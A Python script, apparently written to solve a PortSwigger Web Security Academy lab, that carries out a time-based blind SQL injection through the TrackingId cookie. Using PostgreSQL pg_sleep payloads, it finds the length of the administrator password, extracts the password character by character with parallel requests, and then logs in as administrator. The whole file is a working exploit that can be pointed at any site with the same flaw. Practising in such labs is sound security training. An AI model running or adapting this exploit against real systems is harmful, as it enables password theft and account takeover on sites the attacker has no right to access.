import asyncio
import aiohttp
import time
import urllib.parse

BASE_URL = "https://0ade00ea036d16fe800e1cb8000f00b8.web-security-academy.net"
WORD_LIST = "0123456789abcdefghijklmnopqrstuvwxyz"

async def test_payload(session: aiohttp.ClientSession, payload: str) -> float:
    """測試 payload 並返回響應時間"""
    cookies = {
        "TrackingId": payload,
        "session": "aa"
    }
    
    start_time = time.time()
    try:
        async with session.get(BASE_URL, cookies=cookies, timeout=15) as resp:
            await resp.text()
            elapsed = time.time() - start_time
            return elapsed
    except Exception as e:
        print(f"Request error: {e}")
        return 0.0

async def find_char(session: aiohttp.ClientSession, pos: int) -> str:
    """找出指定位置的密碼字元"""
    for word in WORD_LIST:
        payload = (
            f"';select case when (username='administrator' and "
            f"substring(password,{pos},1)='{word}') "
            f"then pg_sleep(8) else pg_sleep(0) end from users-- "
        )
        
        elapsed = await test_payload(session, urllib.parse.quote(payload))
        
        if elapsed > 7:
            print(f"pos:{pos}, word:{word} === (time: {elapsed:.2f}s)")
            return word
    
    print(f"pos:{pos}, word:? (not found)")
    return "?"

async def find_pw(session: aiohttp.ClientSession, pw_len: int) -> str:
    """並行找出完整密碼"""
    print(f"Starting parallel password discovery for {pw_len} positions...")
    
    # 限制並發數避免過載服務器
    semaphore = asyncio.Semaphore(8)
    
    async def find_char_with_limit(pos):
        async with semaphore:
            return await find_char(session, pos)
    
    tasks = [find_char_with_limit(pos) for pos in range(1, pw_len + 1)]
    results = await asyncio.gather(*tasks)
    
    return "".join(results)

async def find_pw_len(session: aiohttp.ClientSession, max_len: int = 25) -> int:
    """找出密碼長度"""
    print("Finding password length...")
    low, high = 1, max_len
    
    while low <= high:
        mid = (low + high) // 2
        payload = (
            f"';select case when (username='administrator' and length(password)>{mid}) "
            f"then pg_sleep(5) else pg_sleep(0) end from users-- "
        )
        
        print(f"Testing length > {mid}")
        elapsed = await test_payload(session, urllib.parse.quote(payload))
        
        if elapsed > 4:
            low = mid + 1
        else:
            high = mid - 1
    
    print(f"Password length: {low}")
    return low

async def login(session: aiohttp.ClientSession, password: str):
    """使用找到的密碼登入"""
    url = BASE_URL.replace('/filter', '') + "/login"
    
    # 獲取 CSRF token
    async with session.get(url) as resp:
        text = await resp.text()
        import re
        csrf_match = re.search(r'name="csrf"\s+value="([^"]+)"', text)
        if not csrf_match:
            print("Failed to get CSRF token")
            return
        csrf = csrf_match.group(1)
    
    # 登入
    body = {
        "csrf": csrf,
        "username": "administrator",
        "password": password
    }
    
    async with session.post(url, data=body) as resp:
        text = await resp.text()
        if "Your username is: administrator" in text:
            print("*** LOGIN SUCCESS! ***")
        else:
            print("Login failed")

async def main():
    # 簡單的連接器設定
    connector = aiohttp.TCPConnector(limit=50)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        # 1. 找出密碼長度
        pw_len = await find_pw_len(session)
        print(f"[+] Password length: {pw_len}")
        
        if pw_len <= 0:
            print("Failed to determine password length")
            return
        
        # 2. 並行找出完整密碼
        pw = await find_pw(session, pw_len)
        print(f"[+] Found password: {pw}")
        
        # 3. 嘗試登入
        if pw and '?' not in pw:
            await login(session, pw)
        else:
            print(f"Password discovery incomplete: {pw}")

if __name__ == "__main__":
    asyncio.run(main())